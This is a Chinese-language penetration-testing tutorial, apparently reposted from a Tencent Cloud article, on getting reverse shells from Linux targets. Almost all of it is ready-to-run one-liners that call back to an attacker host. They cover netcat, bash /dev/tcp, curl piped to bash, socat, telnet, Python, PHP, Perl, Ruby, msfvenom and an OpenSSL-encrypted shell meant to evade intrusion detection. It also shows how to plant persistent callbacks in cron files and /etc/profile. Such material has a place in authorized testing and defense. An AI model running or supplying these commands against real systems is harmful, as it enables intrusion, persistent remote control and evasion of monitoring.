> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [cloud.tencent.com](https://cloud.tencent.com/developer/article/1818091)

> 在渗透测试实战中，我们经常会遇到 Linux 系统环境，而让 Linux 主机反弹个 shell 是再常见不过的事情了。

![](https://ask.qcloudimg.com/http-save/yehe-5957324/48ztrxfjio.jpeg)

**前言**
------

在[渗透测试](https://cloud.tencent.com/product/wpt?from_column=20065&from=20065)实战中，我们经常会遇到 Linux 系统环境，而让 Linux 主机反弹个 shell 是再常见不过的事情了。

反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。

### **正向连接**

假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。

### **反向连接**

那么为什么要用反弹 shell 呢？

反弹 shell 通常适用于如下几种情况：

• 目标机因防火墙受限，目标机器只能发送请求，不能接收请求。• 目标机端口被占用。• 目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。• 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。•......

对于以上几种情况，我们是无法利用正向连接的，要用反向连接。

那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。

反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。

**利用 netcat 反弹 shell**
----------------------

Netcat 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。

目前，默认的各个 linux 发行版本已经自带了 netcat 工具包，但是可能由于处于安全考虑原生版本的 netcat 带有可以直接发布与反弹本地 shell 的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：

```
wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake && make installmake clean

```

安装完原生版本的 netcat 工具后，便有了 netcat -e 参数，我们就可以将本地 bash 反弹到攻击机上了。

**攻击机开启本地监听：**

**目标机主动连接攻击机：**

```
netcat 47.xxx.xxx.72 2333 -e /bin/bash# nc <攻击机IP> <攻击机监听的端口> -e /bin/bash

```

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/slwdbysybs.png)

image-20210127192540228

**利用 Bash 反弹 shell**
--------------------

个人感觉反弹 shell 最好用的方法就是使用 bash 结合重定向方法的一句话，具体命令如下：

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1或bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"# bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1

```

以下是针对 Bash 反弹一句话进行了拆分说明：

<table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><p>bash -i</p></td><td><p>产生一个 bash 交互环境。</p></td></tr><tr><td><p>&gt;&amp;</p></td><td><p>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</p></td></tr><tr><td><p>/dev/tcp/47.xxx.xxx.72/2333</p></td><td><p>Linux 环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机 47.xxx.xxx.72 的 2333 端口建立一个 tcp 连接。</p></td></tr><tr><td><p>0&gt;&amp;1</p></td><td><p>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</p></td></tr></tbody></table>

Bash 反弹一句完整的解读过程就是：

Bash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333 会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。

**攻击机开启本地监听：**

**目标机主动连接攻击机：**

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1

```

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/1fzd6xewz9.png)

### **Curl 配合 Bash 反弹 shell**

这里操作也很简单，借助了 Linux 中的管道。

首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1

```

并开启 2333 端口的监听。

然后再目标机上执行如下，即可反弹 shell：

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/5wnf7syl54.png)

根据 curl 命令和 Linux 管道的作用，你不难理解这其中的原理。

Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现，`curl IP|bash` 中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。

### **将反弹 shell 的命令写入定时任务**

我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹 shell 命令是要写在 `/var/spool/cron/[crontabs]/<username>` 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。

比如，当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos 系列主机)

比如，当前用户名为 root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu 系列主机)

```
*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/47.xxx.xxx.72/2333 0>&1#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell

```

### **将反弹 shell 的命令写入 / etc/profile 文件**

将以下反弹 shell 的命写入 / etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。

```
/bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &# 最后面那个&为的是防止管理员无法输入命令

```

image-20210127221718744

当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/7vbz447qf7.png)

**利用 Socat 反弹 shell**
---------------------

Socat 是 Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于 socket 的，其功能与 netcat 类似，不过据说可以看做 netcat 的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹 shell，其他详细内容可以参见这里：http://brieflyx.me/2015/linux-tools/socat-introduction/

安装 Socat 的方法很简单：

•Ubuntu 等可以直接使用 `apt-get install socat` 命令进行安装 • 也可以去官网下载源码包：http://www.dest-unreach.org/socat

**攻击机开启本地监听：**

```
socat TCP-LISTEN:2333 -或nc -lvvp 2333

```

**目标机主动连接攻击机：**

```
socat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane

```

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/g5apspis6z.png)

**利用 Telnet 反弹 shell**
----------------------

当 nc 和 / dev/tcp 不可用，且目标主机和攻击机上支持 Telnet 服务时，我们可以使用 Telnet 反弹 shell。

### **方法一**

**攻击机开启本地监听：**

**目标机主动连接攻击机：**

```
mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a

```

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/2sayi5ezvl.png)

### **方法二**

**攻击机需要开启两个本地监听：**

```
nc -lvvp 2333nc -lvvp 4000

```

**目标机主动连接攻击机：**

```
telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000

```

![](https://ask.qcloudimg.com/http-save/yehe-5957324/2jjxoryeid.png)

如上图所示，获得 shell 后，在攻击机 2333 端口的终端上输入的命令会在目标机上执行，执行的回显将通过 4000 端口的终端显示出来。

**各种脚本反弹 shell**
----------------

### **Python 脚本反弹 shell**

当目标主机上有 python 环境时，我们可以用 Python 来反弹 shell。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。

**攻击机开启本地监听：**

**目标机主动连接攻击机：**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/q116zmdyv5.png)

### **php 脚本反弹 shell**

当目标主机上有 php 环境时，我们可以用 php 来反弹 shell。

**攻击机开启本地监听：**

**目标机主动连接攻击机：**

```
php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'

```

### **Perl 脚本反弹 shell**

当目标主机上有 perl 环境时，我们可以用 perl 来反弹 shell。

**攻击机开启本地监听：**

**目标机主动连接攻击机：**

```
perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/fqnyeef9ik.png)

### **Ruby 脚本反弹 shell**

当目标主机上有 ruby 环境时，我们可以用 ruby 来反弹 shell。

**攻击机开启本地监听：**

**目标机主动连接攻击机：**

```
ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'或ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

```

执行效果如下：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/dzzhhikjpc.png)

**使用 Metasploit 生成反弹 shell 用的一句话**
----------------------------------

强大的 Metasploit 框架也为我们提供了生成一句话反弹 shell 的工具，即 msfvenom，绝对的实用。当我们不记得前面说的所有反弹 shell 的反弹语句时，只要我们有 Metasploit，那么我们随时都可以使用 `msfvenom -l` 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。

我们直接可以使用 `msfvenom -l` 结合关键字过滤（如 cmd/unix/reverse），列出我们需要生成的各类反弹 shell 一句话的 payload：

```
msfvenom -l payloads | grep 'cmd/unix/reverse'

```

![](https://ask.qcloudimg.com/http-save/yehe-5957324/yn7lltgkuy.png)

如上图所示，metasploit 支持生成反弹 shell 一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个 python 反弹 shell 的一句话：

```
msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw

```

![](https://ask.qcloudimg.com/http-save/yehe-5957324/7tsnepzbj3.png)

将生成的 python 反弹 shell 的一句话在目标主机上执行即可：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/eqss22twxn.png)

**反弹 shell 后获取模拟终端**
--------------------

其实，上面所讲的各种方法获取的 shell 都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。

• 获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行 sudo 等命令，无法完成。• 标准的错误输出无法显示，无法正常使用 vim 等文本编辑器等。• 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。

![](https://ask.qcloudimg.com/http-save/yehe-5957324/h95aget3gt.png)

这往往都是因为我们获取的 shell 并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。

我们其实可以借助于 python 默认包含的一个 pty 标准库来获取一个标准的虚拟终端环境。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。

我们只需在获取的 shell 里面输入如下命令，即可模拟一个终端设备：

```
python -c "import pty;pty.spawn('/bin/bash')"

```

![](https://ask.qcloudimg.com/http-save/yehe-5957324/mnkbd9egi2.png)

如上图所示，成功模拟在 shell 中出了一个终端设备，并成功执行了 sudo 等命令。

**使用 OpenSSL 反弹加密 shell**
-------------------------

在上文中，我们总结了很多反弹 shell 得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是**所有的流量都是明文传输的**。这些通过 shell 通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS 等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。

### **OpenSSL 简介**

在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。

> SSL 协议要求建立在可靠的传输层协议 (TCP) 之上。SSL 协议的优势在于它是与应用层协议独立无关的，高层的应用层协议 (例如：HTTP，FTP，TELNET 等) 能透明地建立于 SSL 协议之上。SSL 协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及[服务器](https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065)认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。

在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：

```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

```

生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：

![](https://ask.qcloudimg.com/http-save/yehe-5957324/0mtt91ytiz.png)

### **使用 OpenSSL 反弹加密 shell**

实验环境：Linux

目标机：

• 系统：Linux•IP：192.168.1.8

攻击机：

• 系统：Linux•IP：47.xxx.xxx.72

假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 2333

```

![](https://ask.qcloudimg.com/http-save/yehe-5957324/azn6rqknbm.png)

此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。

这时在目标机进行反弹 shell 操作，命令为：

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 > /tmp/s; rm /tmp/s

```

![](https://ask.qcloudimg.com/http-save/yehe-5957324/kzhpp0bbox.png)

这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。

本文参与 [腾讯云自媒体分享计划](https://cloud.tencent.com/developer/support-plan)，分享自微信公众号。

原始发表：2021-04-24，如有侵权请联系 [cloudcommunity@tencent.com](mailto:cloudcommunity@tencent.com) 删除